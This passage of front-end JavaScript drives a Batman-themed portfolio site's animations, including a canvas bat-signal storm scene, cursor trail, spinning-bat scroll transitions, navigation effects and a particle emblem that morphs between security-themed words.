      H = r.height;
      canvas.width = Math.round(W * dpr);
      canvas.height = Math.round(H * dpr);
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      sky = ctx.createLinearGradient(0, 0, 0, H);
      sky.addColorStop(0, '#020305');
      sky.addColorStop(0.55, '#070a11');
      sky.addColorStop(0.85, '#10131b');
      sky.addColorStop(1, '#0a0b0f');
      fog = ctx.createLinearGradient(0, H * 0.72, 0, H);
      fog.addColorStop(0, 'rgba(5, 6, 8, 0)');
      fog.addColorStop(1, 'rgba(5, 6, 8, 0.85)');
      buildCity();
      buildRain();
      buildClouds();
      if (!raf) frame(performance.now(), true);
    }

    function makeBolt(tx, ty) {
      const pts = [];
      const x0 = tx + rand(-140, 140);
      const steps = Math.max(7, Math.round(ty / 26));
      for (let i = 0; i <= steps; i++) {
        const k = i / steps;
        const j = i === 0 || i === steps ? 0 : 1;
        pts.push([lerp(x0, tx, k) + rand(-24, 24) * j, lerp(-10, ty, k) + rand(-8, 8) * j]);
      }
      const branches = [];
      const nb = Math.floor(rand(2, 4));
      for (let b = 0; b < nb; b++) {
        const start = pts[Math.floor(rand(2, Math.max(3, pts.length - 2)))] || pts[0];
        const br = [start.slice()];
        let [bx, by] = start;
        const dir = Math.random() < 0.5 ? -1 : 1;
        for (let k = 0; k < 5; k++) { bx += dir * rand(8, 26); by += rand(10, 24); br.push([bx, by]); }
        branches.push(br);
      }
      return { pts, branches, life: 1 };
    }

    function strike(tx, ty, big) {
      bolts.push(makeBolt(tx, ty));
      flash = big ? 1.4 : 1;
      // your own clicks thunder; the ambient storm only rumbles when rain is on
      if (big) sound.play('thunder', 1);
      else if (sound.mode === 'all') sound.play('thunder', 0.4);
      if (!big) return;
      hero.classList.remove('shake');
      void hero.offsetWidth;
      hero.classList.add('shake');
      for (const b of bats) {
        const dx = b.x - tx, dy = b.y - ty;
        const d = Math.hypot(dx, dy) || 1;
        if (d < 340) { b.vx = (dx / d) * rand(5, 9); b.vy = (dy / d) * rand(3, 6) - 2; b.free = true; }
      }
      for (let i = 0; i < (isTouch ? 4 : 7); i++) {
        bats.push({ x: tx, y: ty, vx: rand(-7, 7), vy: rand(-7, -2), s: rand(6, 12), p: rand(0, 6), f: rand(0.35, 0.5), w: rand(0, 6), free: true });
      }
    }

    function strokePath(pts) {
      ctx.beginPath();
      ctx.moveTo(pts[0][0], pts[0][1]);
      for (let i = 1; i < pts.length; i++) ctx.lineTo(pts[i][0], pts[i][1]);
      ctx.stroke();
    }

    function frame(now, still) {
      if (!sky) { resize(); if (!sky) return; }
      const dt = still ? 1 : clamp((now - last) / 16.67, 0.2, 3);
      last = now;
      const t = now * 0.001;
      const a = aim();
      smx += (a.x - smx) * 0.05 * dt;
      smy += (a.y - smy) * 0.05 * dt;
      if (!Number.isFinite(smx) || !Number.isFinite(smy)) { smx = 0.5; smy = 0.5; }

      ctx.globalCompositeOperation = 'source-over';
      ctx.fillStyle = sky;
      ctx.fillRect(0, 0, W, H);

      for (const c of clouds) {
        if (!still) c.x += c.v * dt;
        if (c.x > W + 20) c.x = -c.c.width;
        ctx.drawImage(c.c, c.x, c.y);
      }

      if (!still && now > nextBolt) {
        strike(rand(W * 0.08, W * 0.6), rand(H * 0.3, H * 0.55), false);
        nextBolt = now + rand(6000, 14000);
      }
      if (flash > 0.01) {
        ctx.fillStyle = `rgba(150, 175, 220, ${Math.min(1, flash) * 0.17})`;
        ctx.fillRect(0, 0, W, H);
        flash *= Math.pow(0.9, dt);
      }

      // bat-signal
      const mobile = W < 720;
      const tx = W * (mobile ? 0.56 : 0.68) + (smx - 0.5) * W * (mobile ? 0.3 : 0.16) + Math.sin(t * 0.35) * W * 0.015;
      const ty = H * (mobile ? 0.17 : 0.22) + (smy - 0.5) * H * 0.1 + Math.cos(t * 0.3) * H * 0.012;
      const lp = layers[1];
      const lOff = -(smx - 0.5) * (lp ? lp.par : 0);
      const sx = src.x + lOff;
      const sy = src.y + scrollY * (lp ? lp.scroll : 0);
      const flick = (0.92 + Math.sin(t * 13) * 0.03 + Math.sin(t * 7.3) * 0.03) * (mobile ? 0.62 : 1);
      const rx = mobile ? W * 0.2 : Math.min(W * 0.13, 190);
      const ry = rx * 0.62;

      ctx.globalCompositeOperation = 'lighter';
      const ang = Math.atan2(ty - sy, tx - sx);
      const nx = Math.cos(ang + Math.PI / 2);
      const ny = Math.sin(ang + Math.PI / 2);
      const beam = ctx.createLinearGradient(sx, sy, tx, ty);
      beam.addColorStop(0, `rgba(255, 220, 110, ${0.34 * flick})`);
      beam.addColorStop(0.6, `rgba(255, 210, 80, ${0.1 * flick})`);
      beam.addColorStop(1, `rgba(255, 210, 80, ${0.05 * flick})`);
      ctx.fillStyle = beam;
      ctx.beginPath();
      ctx.moveTo(sx + nx * 5, sy + ny * 5);
      ctx.lineTo(tx + nx * rx * 0.92, ty + ny * ry * 0.92);
      ctx.lineTo(tx - nx * rx * 0.92, ty - ny * ry * 0.92);
      ctx.lineTo(sx - nx * 5, sy - ny * 5);
      ctx.closePath();
      ctx.fill();

      const halo = ctx.createRadialGradient(tx, ty, 0, tx, ty, rx * 2.4);
      halo.addColorStop(0, `rgba(255, 210, 90, ${0.16 * flick})`);
      halo.addColorStop(1, 'rgba(255, 210, 90, 0)');
      ctx.fillStyle = halo;
      ctx.fillRect(tx - rx * 2.5, ty - rx * 2.5, rx * 5, rx * 5);

      ctx.save();
      ctx.translate(tx, ty);
      ctx.scale(1, ry / rx);
      const disc = ctx.createRadialGradient(0, 0, 0, 0, 0, rx);
      disc.addColorStop(0, `rgba(255, 232, 150, ${0.75 * flick})`);
      disc.addColorStop(0.7, `rgba(255, 210, 70, ${0.55 * flick})`);
      disc.addColorStop(0.92, `rgba(255, 200, 60, ${0.22 * flick})`);
      disc.addColorStop(1, 'rgba(255, 200, 60, 0)');
      ctx.fillStyle = disc;
      ctx.beginPath();
      ctx.arc(0, 0, rx, 0, Math.PI * 2);
      ctx.fill();
      ctx.restore();

      ctx.globalCompositeOperation = 'source-over';
      ctx.save();
      const bw = rx * 1.55;
      ctx.translate(tx - bw / 2, ty - (bw * 0.5 * (ry / rx)) / 2 - ry * 0.08);
      ctx.scale(bw / 200, (bw / 200) * (ry / rx) * 1.05);
      ctx.fillStyle = 'rgba(8, 9, 12, 0.88)';
      ctx.fill(BAT);
      ctx.restore();

      // lightning
      if (bolts.length) {
        ctx.globalCompositeOperation = 'lighter';
        ctx.lineCap = 'round';
        ctx.lineJoin = 'round';
        for (const b of bolts) {
          const al = b.life * (0.6 + Math.random() * 0.4);
          ctx.strokeStyle = `rgba(120, 160, 255, ${al * 0.25})`;
          ctx.lineWidth = 8;
          strokePath(b.pts);
          ctx.strokeStyle = `rgba(225, 235, 255, ${al})`;
          ctx.lineWidth = 1.8;
          strokePath(b.pts);
          ctx.lineWidth = 0.9;
          b.branches.forEach(strokePath);
          b.life -= 0.055 * dt;
        }
        bolts = bolts.filter((b) => b.life > 0);
        ctx.globalCompositeOperation = 'source-over';
      }

      // flying bats (behind the city)
      if (!still && now > nextBats) {
        const n = Math.floor(rand(3, 7));
        const dir = Math.random() < 0.5 ? 1 : -1;
        const y0 = rand(H * 0.12, H * 0.45);
        for (let i = 0; i < n; i++) {
          bats.push({
            x: dir > 0 ? -40 - i * rand(20, 50) : W + 40 + i * rand(20, 50),
            y: y0 + rand(-40, 40), vx: dir * rand(1.8, 3), vy: 0, s: rand(6, 13),
            p: Math.random() * 6, f: rand(0.28, 0.4), w: Math.random() * 6,
          });
        }
        nextBats = now + rand(7000, 13000);
      }
      bats = bats.filter((b) => b.x > -150 && b.x < W + 150 && b.y > -150 && b.y < H + 60);
      for (const b of bats) {
        b.x += b.vx * dt;
        if (b.free) { b.y += b.vy * dt; b.vy += 0.03 * dt; b.vx *= 0.995; }
        else b.y += Math.sin(t * 2 + b.w) * 0.35 * dt;
        b.p += (b.free ? 0.55 : b.f) * dt;
        drawFlyingBat(ctx, b.x, b.y, b.s, b.p, b.vx < 0 ? -1 : 1, '#010102');
      }

      layers.forEach((l) => {
        ctx.drawImage(l.canvas, -MARGIN - (smx - 0.5) * l.par, scrollY * l.scroll, W + MARGIN * 2, H);
      });

      for (const L of lights) {
        const l = layers[L.layer];
        const on = (Math.sin(t * 2.2 * L.s + L.p) + 1) / 2;
        if (on < 0.35) continue;
        const x = L.x - MARGIN - (smx - 0.5) * l.par;
        const y = L.y + scrollY * l.scroll;
        ctx.fillStyle = `rgba(255, 50, 50, ${on * 0.9})`;
        ctx.beginPath();
        ctx.arc(x, y, 1.6, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = `rgba(255, 50, 50, ${on * 0.18})`;
        ctx.beginPath();
        ctx.arc(x, y, 6, 0, Math.PI * 2);
        ctx.fill();
      }

      // searchlight lamp
      ctx.fillStyle = '#16181d';
      ctx.fillRect(sx - 8, sy + 2, 16, 12);
      ctx.save();
      ctx.translate(sx, sy + 2);
      ctx.rotate(ang + Math.PI / 2);
      ctx.fillStyle = '#23252b';
      ctx.fillRect(-9, -6, 18, 12);
      ctx.fillStyle = `rgba(255, 230, 150, ${0.9 * flick})`;
      ctx.fillRect(-8, -7, 16, 2.5);
      ctx.restore();
      const lamp = ctx.createRadialGradient(sx, sy, 0, sx, sy, 26);
      lamp.addColorStop(0, `rgba(255, 225, 130, ${0.55 * flick})`);
      lamp.addColorStop(1, 'rgba(255, 225, 130, 0)');
      ctx.globalCompositeOperation = 'lighter';
      ctx.fillStyle = lamp;
      ctx.fillRect(sx - 26, sy - 26, 52, 52);
      ctx.globalCompositeOperation = 'source-over';

      // rain
      ctx.lineWidth = 1;
      ctx.lineCap = 'butt';
      const buckets = [[], [], []];
      for (const d of drops) {
        if (!still) {
          d.y += d.v * dt;
          d.x += d.v * 0.16 * dt;
          if (d.y > H) { d.y = rand(-60, -10); d.x = rand(-50, W); }
        }
        buckets[d.a < 0.15 ? 0 : d.a < 0.23 ? 1 : 2].push(d);
      }
      [0.1, 0.18, 0.28].forEach((al, i) => {
        ctx.strokeStyle = `rgba(170, 190, 225, ${al})`;
        ctx.beginPath();
        for (const d of buckets[i]) {
          ctx.moveTo(d.x, d.y);
          ctx.lineTo(d.x + d.l * 0.16, d.y + d.l);
        }
        ctx.stroke();
      });

      ctx.fillStyle = fog;
      ctx.fillRect(0, H * 0.72, W, H * 0.28);
    }

    function loop(now) {
      raf = requestAnimationFrame(loop);
      frame(now, false);
    }
    function start() { if (!raf && visible && !document.hidden) { last = performance.now(); raf = requestAnimationFrame(loop); } }
    function stop() { cancelAnimationFrame(raf); raf = 0; }

    new IntersectionObserver((es) => {
      visible = es[0].isIntersecting;
      visible ? start() : stop();
    }).observe(hero);
    document.addEventListener('visibilitychange', () => (document.hidden ? stop() : start()));
    addEventListener('scroll', () => { scrollY = Math.min(window.scrollY, H); }, { passive: true });

    // click / tap the sky → lightning where you clicked
    hero.addEventListener('click', (e) => {
      if (e.target.closest('a, button, input, .hero-strip')) return;
      const r = hero.getBoundingClientRect();
      strike(e.clientX - r.left, e.clientY - r.top, true);
      fx.burst(e.clientX, e.clientY, isTouch ? 14 : 24, '200,220,255');
      hint?.classList.add('gone');
    });

    let rT;
    let lastW = innerWidth;
    addEventListener('resize', () => {
      clearTimeout(rT);
      rT = setTimeout(() => {
        // ignore mobile URL-bar height jitter
        if (innerWidth === lastW && Math.abs(hero.getBoundingClientRect().height - H) < 120) return;
        lastW = innerWidth;
        resize();
      }, 180);
    });

    resize();
    start();
  }

  /* =========================================================
     CURSOR + EMBER TRAIL
     ========================================================= */
  function cursor() {
    addEventListener('pointermove', (e) => { pointer.x = e.clientX; pointer.y = e.clientY; }, { passive: true });
    if (!finePointer) return;
    const dot = $('.cursor-dot');
    const ring = $('.cursor-ring');
    document.body.classList.add('has-cursor', 'cursor-hidden');
    let rx = pointer.x, ry = pointer.y;
    let lx = 0, ly = 0;
    let seen = false;
    let ringRaf = 0;
    function follow() {
      rx += (pointer.x - rx) * 0.2;
      ry += (pointer.y - ry) * 0.2;
      ring.style.transform = `translate3d(${rx}px, ${ry}px, 0)`;
      if (Math.abs(pointer.x - rx) < 0.1 && Math.abs(pointer.y - ry) < 0.1) { ringRaf = 0; return; }
      ringRaf = requestAnimationFrame(follow);
    }
    addEventListener('pointermove', (e) => {
      if (e.pointerType !== 'mouse') return;
      if (!ringRaf) ringRaf = requestAnimationFrame(follow);
      if (!seen) { seen = true; rx = e.clientX; ry = e.clientY; }
      dot.style.transform = `translate3d(${e.clientX}px, ${e.clientY}px, 0)`;
      document.body.classList.remove('cursor-hidden');
      if (Math.hypot(e.clientX - lx, e.clientY - ly) > 14) {
        fx.ember(e.clientX, e.clientY);
        lx = e.clientX;
        ly = e.clientY;
      }
    }, { passive: true });
    document.addEventListener('pointerleave', () => document.body.classList.add('cursor-hidden'));
    follow();
    const hoverSel = 'a, button, .pouch, [data-hover], select, label, .emblem-sec, .svc';
    document.addEventListener('pointerover', (e) => {
      const t = e.target;
      ring.classList.toggle('text', !!t.closest('input, textarea'));
      ring.classList.toggle('hover', !!t.closest(hoverSel) && !t.closest('input, textarea'));
    });
  }

  /* =========================================================
     1966-STYLE SPINNING BAT TRANSITION
     ========================================================= */
  let transitioning = false;
  function batTransition(target, after) {
    const y = typeof target === 'number' ? target : target.getBoundingClientRect().top + window.scrollY;
    const jump = () => {
      document.documentElement.style.scrollBehavior = 'auto';
      window.scrollTo(0, y);
      document.documentElement.style.scrollBehavior = '';
    };
    if (transitioning) return;
    if (Math.abs(y - window.scrollY) < innerHeight * 0.7) {
      window.scrollTo({ top: y, behavior: 'smooth' });
      if (after) setTimeout(after, 600);
      return;
    }
    const el = $('.bat-transition');
    const svg = el && $('svg', el);
    if (!svg || !svg.animate) { jump(); after?.(); return; }
    transitioning = true;
    // the bat body is solid for ~15 viewBox units around its centre; the svg renders at 1px per unit
    const cover = (Math.hypot(innerWidth, innerHeight) / 2 / 15) * 1.2;
    el.classList.add('active');
    sound.play('spin');
    // safety net: never leave the page covered if an animation event goes missing
    const guard = setTimeout(() => {
      if (!transitioning) return;
      svg.getAnimations().forEach((a) => a.cancel());
      jump();
      el.classList.remove('active');
      transitioning = false;
    }, 3000);
    const grow = svg.animate(
      [{ transform: 'scale(0) rotate(0deg)' }, { transform: `scale(${cover}) rotate(720deg)` }],
      { duration: 620, easing: 'cubic-bezier(.7,0,.84,0)', fill: 'forwards' },
    );
    grow.onfinish = () => {
      jump();
      const shrink = svg.animate(
        [{ transform: `scale(${cover}) rotate(720deg)` }, { transform: 'scale(0) rotate(1440deg)' }],
        { duration: 720, easing: 'cubic-bezier(.16,1,.3,1)', fill: 'forwards' },
      );
      shrink.onfinish = () => {
        clearTimeout(guard);
        el.classList.remove('active');
        transitioning = false;
        after?.();
      };
    };
  }

  /* =========================================================
     NAV / MENU / PROGRESS
     ========================================================= */
  function nav() {
    const navEl = $('#nav');
    const bar = $('.scroll-progress i');
    const toTop = $('#toTop');
    const prog = $('.tt-prog');
    const CIRC = 131.95;
    const heroInner = $('.hero-inner');
    let lastY = window.scrollY;
    let ticking = false;
    let _sh = 0, _shT = 0;
    function maxScroll() {
      const n = performance.now();
      if (n - _shT > 400) { _sh = document.documentElement.scrollHeight; _shT = n; }
      return _sh - innerHeight;
    }

    function onScroll() {
      const y = window.scrollY;
      const max = maxScroll();
      const p = max > 0 ? y / max : 0;
      bar.style.transform = `scaleX(${p})`;
      prog.style.strokeDashoffset = CIRC * (1 - p);
      navEl.classList.toggle('scrolled', y > 30);
      const menuOpen = document.body.classList.contains('menu-open');
      if (!menuOpen && y > 500 && y > lastY + 4) navEl.classList.add('hidden');
      else if (menuOpen || y < lastY - 4 || y < 500) navEl.classList.remove('hidden');
      toTop.classList.toggle('show', y > 700);
      lastY = y;
      if (heroInner && y < innerHeight * 1.2) {
        heroInner.style.transform = `translate3d(0, ${y * 0.3}px, 0)`;
        heroInner.style.opacity = String(clamp(1 - y / (innerHeight * 0.75), 0, 1));
      }
      ticking = false;
    }
    addEventListener('scroll', () => { if (!ticking) { ticking = true; requestAnimationFrame(onScroll); } }, { passive: true });
    onScroll();

    const btn = $('#menuBtn');
    const menu = $('#mobileMenu');
    function setMenu(open) {
      document.body.classList.toggle('menu-open', open);
      btn.setAttribute('aria-expanded', String(open));
      btn.setAttribute('aria-label', open ? 'Close menu' : 'Open menu');
      menu.setAttribute('aria-hidden', String(!open));
    }
    btn.addEventListener('click', () => setMenu(!document.body.classList.contains('menu-open')));
    addEventListener('keydown', (e) => { if (e.key === 'Escape') setMenu(false); });

    // every in-page link travels by bat
    $$('a[href^="#"]').forEach((a) => a.addEventListener('click', (e) => {
      const id = a.getAttribute('href').slice(1);
      const t = id && document.getElementById(id);
      if (!t) return;
      e.preventDefault();
      if (document.body.classList.contains('menu-open')) setMenu(false);
      batTransition(id === 'home' ? 0 : t, () => {
        if (e.detail === 0) { t.setAttribute('tabindex', '-1'); t.focus({ preventScroll: true }); }
      });
      history.replaceState(null, '', '#' + id);
    }));
    toTop.addEventListener('click', () => batTransition(0));

    // active section
    const links = $$('.nav-links a');
    const map = new Map(links.map((a) => [a.getAttribute('href').slice(1), a]));
    const io = new IntersectionObserver((es) => {
      es.forEach((e) => {
        if (!e.isIntersecting) return;
        links.forEach((a) => a.classList.remove('active'));
        map.get(e.target.id)?.classList.add('active');
      });
    }, { rootMargin: '-45% 0px -50% 0px' });
    $$('main section[id]').forEach((s) => io.observe(s));

    // decrypt effect on hover
    $$('.nav-links a, .mobile-menu nav a').forEach((a) => a.addEventListener('pointerenter', () => scramble(a, 380)));

    // sound: effects → effects + rain → muted
    const sb = $('#soundToggle');
    const LABEL = { fx: 'effects', all: 'effects + rain', off: 'muted' };
    const paint = (m) => {
      sb.dataset.mode = m;
      sb.dataset.tip = `Sound: ${LABEL[m]}`;
      sb.setAttribute('aria-label', `Sound: ${LABEL[m]}. Click to change`);
    };
    if (sb) {
      paint(sound.mode);
      sb.addEventListener('click', () => {
        const m = sound.cycle();
        paint(m);
        if (m !== 'off') sound.play('select');
        toast({ fx: 'Sound: click effects on · rain off', all: 'Sound: effects + soft rain over Gotham', off: 'Sound muted' }[m]);
      });
    }
  }

  /* =========================================================
     REVEAL + SCRAMBLE + COUNTERS
     ========================================================= */
  const GLYPHS = '!<>-_\\/[]{}=+*^?#01ABCDEFXZ';
  function scramble(el, dur = 900) {
    if (el._scrambling) return;
    el._scrambling = true;
    const nodes = [];
    const w = document.createTreeWalker(el, NodeFilter.SHOW_TEXT);
    while (w.nextNode()) nodes.push({ n: w.currentNode, t: w.currentNode.textContent });
    const total = nodes.reduce((s, o) => s + o.t.length, 0);
    const t0 = performance.now();
    (function f(now) {
      const k = clamp((now - t0) / dur, 0, 1);
      const done = Math.floor(k * total);
      let idx = 0;
      nodes.forEach((o) => {
        let out = '';
        for (const ch of o.t) {
          out += idx < done || ch === ' ' || ch === '\n' ? ch : GLYPHS[(Math.random() * GLYPHS.length) | 0];
          idx++;
        }
        o.n.textContent = out;
      });
      if (k < 1) requestAnimationFrame(f);
      else { nodes.forEach((o) => { o.n.textContent = o.t; }); el._scrambling = false; }
    })(t0);
  }

  function countUp(el) {
    const target = parseFloat(el.dataset.count);
    const dec = parseInt(el.dataset.decimals || '0', 10);
    const suffix = el.dataset.suffix || '';
    const t0 = performance.now();
    (function f(now) {
      const k = clamp((now - t0) / 1700, 0, 1);
      const e = 1 - Math.pow(2, -10 * k);
      el.textContent = (target * (k === 1 ? 1 : e)).toFixed(dec) + suffix;
      if (k < 1) requestAnimationFrame(f);
    })(t0);
  }

  function reveals() {
    $$('[data-stagger]').forEach((wrap) => {
      [...wrap.children].forEach((c, i) => c.style.setProperty('--d', `${i * 0.1}s`));
    });
    $$('.svc-grid .svc').forEach((c, i) => c.style.setProperty('--d', `${(i % 4) * 0.07}s`));
    $$('.projects .project').forEach((c, i) => c.style.setProperty('--d', `${(i % 3) * 0.08}s`));

    const io = new IntersectionObserver((es) => {
      es.forEach((e) => {
        if (!e.isIntersecting) return;
        const el = e.target;
        el.classList.add('in');
        $$('.scramble', el).forEach((h) => scramble(h));
        $$('.count', el).forEach(countUp);
        io.unobserve(el);
      });
    }, { threshold: 0.1, rootMargin: '0px 0px -5% 0px' });
    $$('.reveal').forEach((el) => io.observe(el));

    // replay counters on click
    const stats = $('.stats');
    if (stats) {
      stats.dataset.hover = '';
      stats.addEventListener('click', () => $$('.count', stats).forEach(countUp));
    }
  }

  /* =========================================================
     TIMELINE
     ========================================================= */
  function timeline() {
    const tl = $('#timeline');
    if (!tl) return;
    const prog = $('.tl-progress', tl);
    const items = $$('.tl-item', tl);
    let ticking = false;
    function update() {
      const r = tl.getBoundingClientRect();
      const line = innerHeight * 0.62;
      prog.style.transform = `scaleY(${clamp((line - r.top) / r.height, 0, 1)})`;
      const tops = items.map((it) => it.getBoundingClientRect().top);
      items.forEach((it, i) => it.classList.toggle('lit', tops[i] + 40 < line));
      ticking = false;
    }
    addEventListener('scroll', () => { if (!ticking) { ticking = true; requestAnimationFrame(update); } }, { passive: true });
    update();
  }

  /* =========================================================
     CARD TILT + MAGNETIC BUTTONS + SPOTLIGHT
     ========================================================= */
  function cardTilt() {
    if (!finePointer) return;
    $$('.tilt').forEach((card) => {
      card.addEventListener('pointermove', (e) => {
        const r = card.getBoundingClientRect();
        const x = (e.clientX - r.left) / r.width;
        const y = (e.clientY - r.top) / r.height;
        card.style.setProperty('--rx', `${(0.5 - y) * 8}deg`);
        card.style.setProperty('--ry', `${(x - 0.5) * 10}deg`);
        card.style.setProperty('--gx', `${x * 100}%`);
        card.style.setProperty('--gy', `${y * 100}%`);
      });
      card.addEventListener('pointerleave', () => {
        card.style.setProperty('--rx', '0deg');
        card.style.setProperty('--ry', '0deg');
      });
    });
    $$('.magnetic').forEach((b) => {
      b.addEventListener('pointermove', (e) => {
        const r = b.getBoundingClientRect();
        const dx = e.clientX - (r.left + r.width / 2);
        const dy = e.clientY - (r.top + r.height / 2);
        b.style.transform = `translate(${dx * 0.25}px, ${dy * 0.35}px)`;
      });
      b.addEventListener('pointerleave', () => { b.style.transform = ''; });
    });
    $$('.svc').forEach((c) => {
      c.addEventListener('pointermove', (e) => {
        const r = c.getBoundingClientRect();
        c.style.setProperty('--mx', `${e.clientX - r.left}px`);
        c.style.setProperty('--my', `${e.clientY - r.top}px`);
      });
    });
  }

  /* =========================================================
     EMBLEM — 3D particle morph (the signature moment)
     ========================================================= */
  function emblem() {
    const sec = $('#emblem');
    const canvas = $('#emblemCanvas');
    if (!sec || !canvas) return;
    const ctx = canvas.getContext('2d');
    const wordEl = $('#emblemWord');
    const kicker = $('#emblemKicker');
    const navEl = $('#emblemNav');
    const S = 360;

    const rr = (g, x, y, w, h, r) => { g.beginPath(); if (g.roundRect) g.roundRect(x, y, w, h, r); else g.rect(x, y, w, h); g.fill(); };
    const cut = (g, fn) => { g.save(); g.globalCompositeOperation = 'destination-out'; fn(); g.restore(); };
    const SHAPES = [
      { word: 'VIGILANCE', draw(g) { g.save(); g.translate(10, 90); g.scale(1.7, 1.7); g.fill(BAT); g.restore(); } },
      {
        word: 'DEFEND',
        draw(g) {
          g.save();
          g.translate(180 - 12 * 13.5, 180 - 12 * 13.5);
          g.scale(13.5, 13.5);
          g.fill(new Path2D('M12 3l8 3v6c0 4.5-3.4 8.3-8 9-4.6-.7-8-4.5-8-9V6l8-3z'));
          g.globalCompositeOperation = 'destination-out';
          g.lineWidth = 1.7;
          g.lineCap = 'round';
          g.lineJoin = 'round';
          g.stroke(new Path2D('M8.5 12l2.5 2.5 4.5-5'));
          g.restore();
        },
      },
      {
        word: 'ENCRYPT',
        draw(g) {
          rr(g, 82, 160, 196, 150, 20);
          g.lineWidth = 30;
          g.beginPath();
          g.moveTo(118, 175);
          g.lineTo(118, 150);
          g.arc(180, 150, 62, Math.PI, 0);
          g.lineTo(242, 175);
          g.stroke();
          cut(g, () => { g.beginPath(); g.arc(180, 220, 20, 0, Math.PI * 2); g.fill(); g.fillRect(171, 228, 18, 46); });
        },
      },
      {
        word: 'HUNT BUGS',
        draw(g) {
          g.beginPath(); g.ellipse(180, 205, 60, 82, 0, 0, Math.PI * 2); g.fill();
          g.beginPath(); g.arc(180, 110, 34, 0, Math.PI * 2); g.fill();
          g.lineWidth = 12;
          g.lineCap = 'round';
          [[125, 165, 68, 128], [120, 205, 58, 205], [125, 245, 68, 285]].forEach(([x1, y1, x2, y2]) => {
            g.beginPath(); g.moveTo(x1, y1); g.lineTo(x2, y2); g.moveTo(360 - x1, y1); g.lineTo(360 - x2, y2); g.stroke();
          });
          g.lineWidth = 8;
          g.beginPath(); g.moveTo(165, 84); g.lineTo(138, 42); g.moveTo(195, 84); g.lineTo(222, 42); g.stroke();
          cut(g, () => { g.lineWidth = 6; g.beginPath(); g.moveTo(180, 140); g.lineTo(180, 282); g.stroke(); });
        },
      },
      {
        word: 'AI SECURITY',
        draw(g) {
          rr(g, 95, 95, 170, 170, 18);
          for (let i = 0; i < 4; i++) {
            const o = 112 + i * 40;
            g.fillRect(o, 52, 16, 38); g.fillRect(o, 270, 16, 38); g.fillRect(52, o, 38, 16); g.fillRect(270, o, 38, 16);
          }
          cut(g, () => rr(g, 122, 122, 116, 116, 10));
          g.font = '700 70px "Chakra Petch", sans-serif';
          g.textAlign = 'center';
          g.textBaseline = 'middle';
          g.fillText('AI', 180, 184);
        },
      },
      {
        word: 'MANPREET',
        draw(g) {
          g.font = '400 270px "Bebas Neue", Impact, sans-serif';
          g.textAlign = 'center';
          g.textBaseline = 'middle';
          g.fillText('M', 180, 196);
        },
      },
    ];

    let W = 0, H = 0, N = 0, fs = 1;
    const DEPTH = 26;
    let P = null;
    let cur = 0;
    let visible = false, raf = 0, last = 0;
    let lastUser = 0, nextAuto = 0, hiddenAt = 0;
    let rY = 0, rX = 0;
    const mouse = { x: -1e4, y: -1e4 };
    const cache = [];

    function shapePts(i) {
      if (cache[i] && cache[i].n === N) return cache[i].pts;
      const c = document.createElement('canvas');
      c.width = S;
      c.height = S;
      const g = c.getContext('2d', { willReadFrequently: true });
      g.fillStyle = '#fff';
      g.strokeStyle = '#fff';
      SHAPES[i].draw(g);
      const d = g.getImageData(0, 0, S, S).data;
      const pool = [];
      for (let y = 0; y < S; y += 2) for (let x = 0; x < S; x += 2) if (d[(y * S + x) * 4 + 3] > 140) pool.push(x - S / 2, y - S / 2);
      const m = pool.length / 2;
      const pts = new Float32Array(N * 3);
      for (let k = 0; k < N; k++) {
        const j = ((Math.random() * m) | 0) * 2;
        pts[k * 3] = (pool[j] ?? 0) + rand(-1, 1);
        pts[k * 3 + 1] = (pool[j + 1] ?? 0) + rand(-1, 1);
        pts[k * 3 + 2] = rand(-1, 1);
      }
      cache[i] = { n: N, pts };
      return pts;
    }

    function alloc() {
      const f = () => new Float32Array(N);
      P = { x: f(), y: f(), z: f(), vx: f(), vy: f(), vz: f(), tx: f(), ty: f(), tz: f(), sx: f(), sy: f(), s: f(), b: new Uint8Array(N) };
    }
    function scatter(fromCurrent) {
      for (let k = 0; k < N; k++) {
        if (fromCurrent) {
          P.vx[k] += rand(-40, 40); P.vy[k] += rand(-40, 40); P.vz[k] += rand(-40, 40);
        } else {
          const a = rand(0, Math.PI * 2);
          const b = Math.acos(rand(-1, 1));
          const r = rand(320, 950);
          P.x[k] = r * Math.sin(b) * Math.cos(a);
          P.y[k] = r * Math.sin(b) * Math.sin(a);
          P.z[k] = r * Math.cos(b);
          P.vx[k] = P.vy[k] = P.vz[k] = 0;
        }
      }
    }
    function setTargets(i) {
      const pts = shapePts(i);
      for (let k = 0; k < N; k++) {
        P.tx[k] = pts[k * 3];
        P.ty[k] = pts[k * 3 + 1];
        P.tz[k] = pts[k * 3 + 2] * DEPTH;
      }
    }
    function labels() {
      wordEl.textContent = SHAPES[cur].word;
      scramble(wordEl, 600);
      kicker.textContent = `FORM ${String(cur + 1).padStart(2, '0')} / ${String(SHAPES.length).padStart(2, '0')}`;
      $$('button', navEl).forEach((b, j) => { b.classList.toggle('active', j === cur); b.setAttribute('aria-selected', String(j === cur)); });
    }
    function morph(i, bx, by, byUser = bx != null) {
      cur = (i + SHAPES.length) % SHAPES.length;
      setTargets(cur);
      for (let k = 0; k < N; k++) { P.vx[k] += rand(-5, 5); P.vy[k] += rand(-5, 5); P.vz[k] += rand(-9, 9); }
      if (bx != null) {
        for (let k = 0; k < N; k++) {
          const dx = P.sx[k] - bx, dy = P.sy[k] - by;
          const d = Math.hypot(dx, dy) || 1;
          if (d < 260) { const f = (1 - d / 260) * 24; P.vx[k] += (dx / d) * f; P.vy[k] += (dy / d) * f; }
        }
      }
      labels();
      if (byUser) sound.play('whoosh');
    }

    function resize() {
      const r = sec.getBoundingClientRect();
      if (r.width < 10 || r.height < 10) return;
      const dpr = Math.min(window.devicePixelRatio || 1, DPR_CAP);
      W = r.width;
      H = r.height;
      canvas.width = Math.round(W * dpr);
      canvas.height = Math.round(H * dpr);
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      fs = Math.min(W * 0.9, H * 0.72) / S;
      const n = W < 760 ? 1300 : Math.round(clamp((W * H) / 360, 2200, 4200));
      if (n !== N) { N = n; alloc(); scatter(false); setTargets(cur); }
    }

    function frame(now) {
      const dt = clamp((now - last) / 16.67, 0.2, 2.5);
      last = now;
      const t = now * 0.001;
      const a = aim();
      const tgY = (a.x - 0.5) * 0.95 + Math.sin(t * 0.45) * 0.24;
      const tgX = (a.y - 0.5) * -0.55 + Math.cos(t * 0.3) * 0.08;
      rY += (tgY - rY) * 0.05 * dt;
      rX += (tgX - rX) * 0.05 * dt;
      const cY = Math.cos(rY), sY = Math.sin(rY), cX = Math.cos(rX), sX = Math.sin(rX);
